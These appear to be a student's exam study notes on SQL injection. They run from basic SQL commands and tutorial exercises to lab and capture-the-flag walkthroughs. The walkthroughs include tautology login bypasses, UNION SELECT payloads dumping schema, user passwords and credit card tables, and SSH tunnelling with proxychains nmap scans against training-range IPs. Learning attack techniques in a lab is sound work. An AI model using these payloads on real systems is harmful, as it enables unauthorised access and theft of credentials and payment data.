@@ -1,0 +1,170 @@
+This is very Important for the exam!!!! (SQL Injection)
+Exam is on December 17th
+
+Easy 5-step SQL Injection
+  1. Identify Vulnerable Fields
+  2. Identify # of Columns w/ Golden Statement
+  3. Edit Golden Statement
+  4. Craft Query
+  5. Get Money (Points)/Pass Exam 
+  
+SQL ----> Structured Query Language - ANSI Standard
+
+Standard SQL commands
+  SELECT
+	Extracts data from a database
+  UNION
+	Used to combine the result-set of two or more SELECT statements
+  USE
+	Selects the DB to use
+  UPDATE
+	Updates data in a database
+  DELETE
+	Deletes data from a database
+  INSERT INTO
+	Inserts new data into a database
+  CREATE DATABASE
+	Creates a new database
+  ALTER DATABASE
+	Modifies a database
+  CREATE TABLE
+	Creates a new table
+  ALTER TABLE
+	Modifies a table
+  DROP TABLE
+	Deletes a table
+  CREATE INDEX
+	Creates an index (search key)
+  DROP INDEX
+	Deletes an index
+	
+  All commands end in a semicolon (;)
+  Commands aren't case sensitive but schema names are
+  
+ 2 standard SQL schema, informational and session
+ Tables in Information schema we will be using is columns
+ 
+ Demo/////////////
+   show tables from session
+   show columns from session.Tires;
+   (Select from one column)select tired from session.Tires;
+   (Select from multiple columns)select tired,name,size,cost from session.Tires;
+   
+   show tables from session;
+   show colums from session;
+   
+   select tired,name,size,cost from session.Tires union slect id,name,pass from session.user;
+                        ^------------                             -----^
+             This command won't work because they don't have the same number of columns
+             
+             
+             
+    SQL DEMO site///////////////////////////////////////
+    Website url: https://sqlbolt.com/
+    Lesson 1
+    Catch all --- select * from movies;
+     1. Find the title of each film
+      	SELECT Title from movies;
+     2. Find the director of each film
+    	Find the director of each film
+     3. Find the title and director of each film	
+    	SELECT title,director from movies;
+     4. Find title and year of each film
+        SELECT title,year from movies;
+     5. Find all the information about each film
+     	 select * from movies;
+     Lesson 2
+      1. Find the movie with a row id of 6
+      	 SELECT * FROM movies WHERE id=6;
+      2. Find the movies released in the years between 2000 and 2010 
+         SELECT * FROM movies WHERE Year between 2000 AND 2010; 
+      3. Find the movies not released in the years between 2000 and 2010 
+         SELECT * FROM movies WHERE Year not between 2000 AND 2010;
+      4. Find the first 5 Pixar movies and their release year
+         SELECT title FROM movies WHERE id <=5 ;
+     Lesson 3
+      1. Find all the Toy Story movies 
+         SELECT * FROM movies WHERE Title LIKE "%Toy Story%";
+      2. Find all the movies directed by John Lasseter 
+         SELECT * FROM movies WHERE director = "John Lasseter";
+      3. Find all the movies (and director) not directed by John Lasseter
+         SELECT * FROM movies WHERE director != "John Lasseter";
+      4. Find all the WALL-* movies
+         SELECT * FROM movies WHERE Title LIKE "WALL-_";
+      Lesson 4
+       1. List all directors of Pixar movies (alphabetically), without duplicates
+          
+  GET =====> URL
+  POST ====> ID
+  You can find out if a field is properly santitized thorugh a '
+    
+DEMO: SQL Injection ////////////////////////////////////////////////
+  IP==10.50.35.49 on terminator firefox
+  ' in password and username field to check for sanitization
+  TOM' OR 1='1 in password and username field
+    Use developer tool then go to the network section and redo the login
+    then click on the GET request and then switch it to raw
+    Then copy and past it into the url as such -----
+    
+    
+    POST Method
+    10.50.35.49/Union.html
+    Ford' OR 1='1 
+    Dodge' OR 1='1
+    Honda' OR 1='1
+    Audi' OR 1='1   (This one worked)
+    
+    Audi' UNION SELECT 1,2,3,4; #
+    Error because not correct number of colums
+    Audi' UNION SELECT 1,2,3,4,5; #
+    Now we create golden statement
+    Audi' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns; #
+    Audi' UNION SELECT tireid,2,name,size,cost FROM session.Tires; #
+    Audi' UNION SELECT id,2,name,pass,5 FROM session.user; #
+    Audi' UNION SELECT @@version,2,3,4,5; #
+    
+    GET Method
+	 IN URL
+	    http://10.50.35.49/uniondemo.php?Selection=1 OR 1=1
+	    http://10.50.35.49/uniondemo.php?Selection=2 OR 1=1
+    	    http://10.50.35.49/uniondemo.php?Selection=2 UNION SELECT 1,2,3
+    	    2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
+     	    2 UNION SELECT id,pass,name FROM session.user
+     	    2 UNION SELECT id,pass,@@version
+    
+    DO NOT DROP ANY TABLES!!!!!!!!! HE WILL NOT FIX IT
+    
+///////////////////////////////////////////////////////////////////////////////////////////
+CTFs
+  T1 === 10.100.28.48
+  port: 80
+  1st Term
+    ssh -MS /tmp/jump student@10.50.29.89
+  2nd Term
+    ssh -S /tmp/jump jim
+  3rd Term
+    ssh -S /tmp/jump jim -O forward -D9050
+    proxychains nmap 10.100.28.48 -T4 -Pn -vvvv -p 1-9999 (Ports found: 80,4444)
+    ssh -S /tmp/jump jim -O forward -L 3300:10.100.28.48:80 -L 3301:10.100.28.48:4444
+  (In URL) 127.0.0.1:3300
+  
+  Category Question
+    http://127.0.0.1:3300/cases/productsCategory.php?category=1%20OR%201=1
+  Tables question
+  Admin Credentials
+    http://127.0.0.1:3300/cases/productsCategory.php?category=1 UNION SELECT id,username,password FROM sqlinjection.members
+  Products
+    tom' OR 1= '1
+  SQL Version
+    http://127.0.0.1:3300/cases/productsCategory.php?category=1%20UNION%20SELECT%201,2,@@version
+  Credit Card
+    http://127.0.0.1:3300/cases/productsCategory.php?category=1 UNION SELECT id,creditcard_number,date FROM sqlinjection.payments
+  ID Search
+    http://127.0.0.1:3300/cases/productsCategory.php?category=1 UNION SELECT 1,data,id FROM sqlinjection.share4
+    echo"<base64 flag>" | base64 -d
+  Create An ADMIN User
+  
+                                                          ||
+  In order to find the answers to most of the questions   \/
+  http://127.0.0.1:3300/cases/productsCategory.php?category=1%20UNION%20SELECT%20table_schema,table_name,column_name%20FROM%20information_schema.columns
+    
